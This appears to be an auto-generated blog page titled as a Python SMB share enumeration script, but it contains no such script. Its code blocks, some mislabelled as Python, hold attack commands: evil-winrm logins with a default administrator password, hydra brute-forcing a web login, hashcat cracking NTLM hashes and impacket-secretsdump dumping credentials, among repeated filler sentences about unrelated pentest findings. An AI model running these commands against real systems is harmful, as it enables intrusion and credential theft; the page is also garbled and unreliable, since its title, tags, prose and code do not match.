---
TitleSEO: "SMB Share Enumeration Script in Python | ZureFX"
TitlePost: "SMB Share Enumeration Script — Python"
Author: "ZureFX"
Description: "A Python script for smb share enumeration script. Built for security research and automation."
Keywords: "rust, fuzzer, parser, python"
URL: "https://zurefx.github.io/scripting/script-smb-share-enumeration-script-517.html"
URL_IMAGES: ""
Date: "2024-08-04"
Tags: "Rust, Fuzzer, Parser, Python"
Section: "scripting"
Lang: "en"
main_img: "script-smb-share-enumeration-script-517"
Permalink: "/scripting/script-smb-share-enumeration-script-517.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The web application was vulnerable to Server-Side Template Injection (SSTI). The kernel version was outdated and vulnerable to a publicly known exploit. Weak file permissions allowed modification of critical system files.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `nmap`
- `rpcclient`
- `metasploit`

## Implementation

### Core Logic

Group Policy Preferences contained encrypted but recoverable credentials. The database credentials were hardcoded in the application source code.

```python
evil-winrm -i 10.39.216.192 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p53,445,27017 10.122.146.120 -oN scan.txt
gobuster dir -u http://10.39.204.95/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.48.90.123 -u administrator -p 'P@ssw0rd!'
```

Initial enumeration revealed several interesting open ports on the target. The application stored sensitive credentials in an unencrypted configuration file.

### Helper Functions

Privilege escalation was possible due to misconfigured sudo permissions. Network traffic analysis revealed unencrypted communications containing user credentials.

```python
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.106.197.209 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.67.98.94 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine.

```bash
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Advanced Options

The kernel version was outdated and vulnerable to a publicly known exploit. Post-exploitation enumeration revealed a path to domain administrator privileges. The database credentials were hardcoded in the application source code.

```bash
gobuster dir -u http://10.31.12.246/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.116.49.72/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.103.243.120
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Output

### Example Output

The scheduled task ran with elevated privileges and could be abused for escalation. Group Policy Preferences contained encrypted but recoverable credentials.

```
[+] Scanning target...
[+] Found 16 results
[+] Done in 26.14s
```
